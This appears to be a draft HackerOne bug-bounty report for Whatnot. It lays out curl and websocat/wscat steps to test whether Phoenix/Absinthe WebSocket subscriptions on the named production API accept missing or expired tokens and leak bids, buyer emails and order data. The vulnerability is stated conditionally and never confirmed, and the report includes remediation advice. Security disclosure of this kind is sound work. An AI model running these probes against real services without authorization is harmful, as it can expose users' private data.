# HackerOne Submission — Unauthenticated GraphQL Subscription via WebSocket (Phoenix Channels)

**Program:** Whatnot  
**Weakness:** Broken Authentication / Missing Authorization  
**Severity:** High  
**Asset:** api.whatnot.com  

---

## Summary

Whatnot uses Elixir/Phoenix with Absinthe GraphQL subscriptions for real-time features (live bids, chat, viewer counts, notifications). Phoenix Channels authenticate at socket connection time and separately at channel join time. If either check is absent or uses a weaker token format than the REST/HTTP API, an attacker can establish an authenticated WebSocket subscription using no token (or an expired/invalid token) and receive real-time data streams — including bid amounts, buyer identities, chat messages, and order events.

---

## Steps to Reproduce

### Step 1 — Discover the WebSocket endpoint

```bash
# Test common Phoenix socket paths
for path in "/socket/websocket" "/graphql/websocket" "/live/websocket" "/ws" "/subscriptions"; do
  result=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Upgrade: websocket" \
    -H "Connection: Upgrade" \
    -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
    -H "Sec-WebSocket-Version: 13" \
    "https://api.whatnot.com${path}")
  echo "${path} -> HTTP ${result}"
done
```

A `101 Switching Protocols` response confirms a WebSocket endpoint.

---

### Step 2 — Test unauthenticated connection

Using `websocat` (install: `cargo install websocat`):

```bash
# Attempt connection with NO token
websocat "wss://api.whatnot.com/socket/websocket?vsn=2.0.0"

# After connection, send Phoenix join message:
["1","1","phoenix","phx_join",{}]

# Listen for response - if you get a "phx_reply" with status "ok" instead of an auth error,
# the socket accepts unauthenticated connections
```

---

### Step 3 — Join a live stream channel without auth

```bash
# Connect with no auth and try to join a public livestream topic
websocat "wss://api.whatnot.com/socket/websocket?vsn=2.0.0" --text << 'EOF'
["1","1","phoenix","phx_join",{}]
["2","2","live_stream:STREAM_ID","phx_join",{}]
["3","3","live_stream:STREAM_ID","subscribe",{"query":"subscription { bid { amount bidderId } }"}]
EOF
```

If bids are returned without authentication, the channel lacks auth.

---

### Step 4 — Test Absinthe subscription endpoint

```bash
# Using wscat (npm install -g wscat)
wscat -c "wss://api.whatnot.com/graphql/websocket" \
  --header "Origin: https://www.whatnot.com"

# After connecting, send GraphQL over WebSocket (graphql-ws protocol):
{"type":"connection_init","payload":{}}

# Then subscribe WITHOUT a token:
{
  "id": "1",
  "type": "subscribe",
  "payload": {
    "query": "subscription { liveStreamUpdated { id viewerCount bids { amount bidder { username } } } }"
  }
}
```

---

### Step 5 — Test with expired token

```bash
# Use an expired/revoked wn_access_tk_ token in the WebSocket handshake
# WebSocket auth often uses a separate code path from HTTP Bearer auth
wscat -c "wss://api.whatnot.com/graphql/websocket?token=wn_access_tk_EXPIRED_TOKEN" \
  --header "Origin: https://www.whatnot.com"

# Also test passing token in connection_init payload (graphql-ws protocol):
{"type":"connection_init","payload":{"Authorization":"Bearer wn_access_tk_EXPIRED_TOKEN"}}
```

If subscription data flows with an expired token, token revocation is not enforced on WebSocket connections.

---

### Step 6 — Subscribe to private order/payment events

```bash
# If connected, try subscribing to sensitive topics
{
  "id": "2",
  "type": "subscribe",
  "payload": {
    "query": "subscription { orderCreated { id buyer { email paymentCard { last4 } } totalPrice } }"
  }
}
```

---

## Expected Result

WebSocket connection without valid token should be rejected:
```json
{"type": "connection_error", "payload": {"message": "Unauthorized"}}
```

## Actual Result (if vulnerable)

Connection is accepted and subscription data flows without authentication or with expired tokens.

---

## Impact

- Real-time exposure of all bid amounts and bidder identities in live auctions (breaks auction privacy)
- Leaks buyer email addresses, payment card last-4 digits via order events
- Exposes private chat messages from livestreams
- Expired/revoked tokens remain valid on WebSocket connections — account compromise persists after password change
- Mass surveillance of Whatnot's real-time marketplace activity

---

## Recommended Fix

- Enforce token validation in `UserSocket.connect/3` before allowing any channel join
- Re-validate token on every channel join in `channel.join/3`  
- Use the same token validation middleware for WebSocket as for HTTP requests
- Implement token expiry checks on WebSocket connections — close connections when token expires
- Reference: [Phoenix Channels Security](https://hexdocs.pm/phoenix/channels.html#authentication)
